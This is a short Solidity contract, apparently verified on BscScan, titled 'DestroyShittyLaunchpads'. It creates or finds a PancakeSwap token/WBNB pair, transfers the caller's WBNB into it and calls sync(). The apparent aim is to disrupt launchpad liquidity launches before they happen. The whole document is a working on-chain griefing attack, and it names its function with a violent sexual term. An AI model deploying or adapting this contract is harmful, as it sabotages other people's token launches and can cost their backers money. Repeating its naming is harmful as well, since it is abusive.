/**
 *Submitted for verification at BscScan.com on 2022-04-26
*/

pragma solidity ^0.6.12;

// SPDX-License-Identifier: MIT



interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract DestroyShittyLaunchpads {
    
    address public immutable pcsFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    IUniswapV2Factory PCSFACTORY = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    address public immutable wbnb =  0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);


    function RapeLaunch(address tokenAddress, uint amount) external {
         address pcsPair;
         pcsPair = PCSFACTORY.getPair(tokenAddress, wbnb);
         if (pcsPair == address(0)) {pcsPair = PCSFACTORY.createPair(tokenAddress, wbnb);}
        

            WBNB.transferFrom(msg.sender, pcsPair, amount);
            IUniswapV2Pair(pcsPair).sync();
        }

}